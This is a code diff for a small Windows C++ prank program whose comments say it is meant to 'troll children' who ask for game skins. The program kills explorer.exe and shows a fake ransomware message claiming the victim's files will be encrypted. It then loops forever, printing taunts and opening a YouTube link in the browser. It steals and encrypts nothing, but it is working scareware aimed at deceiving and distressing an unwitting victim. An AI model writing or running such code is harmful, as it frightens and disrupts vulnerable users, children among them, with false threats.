@@ -5,119 +5,39 @@
 #include <shellapi.h>
 #include <iostream>
 
-
 //This is harmless, but to the 9 year old in rift, their pc is fucked.
 //Dont use this to harm anyone. Just to troll children :D
 
+bool bDeveloper = false;
+
+void SpamShit()
+{
+	std::cout << "GET FUCKED LMFAOO\n";
+	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n";
+	ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
+}
+
 int main()
 {
-    system("Color 0C");
-    system("taskkill /IM explorer.exe /F"); 
-ok:
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
-    std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
+	system("Color 0C");
 
+	if (!bDeveloper)
+		system("taskkill /IM explorer.exe /F");
 
-   
+	if (bDeveloper)
+	{
+	}
+	else
+		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
 
-    MessageBox(nullptr, TEXT("Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)"), TEXT("skīñś"), MB_OK);
+	if (bDeveloper)
+		SpamShit();
+	else
+	{
+	LoadShit:
+		SpamShit();
+		goto LoadShit;
+	}
 
-
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    goto ok;
-
-return 0;
+	return 0;
 }
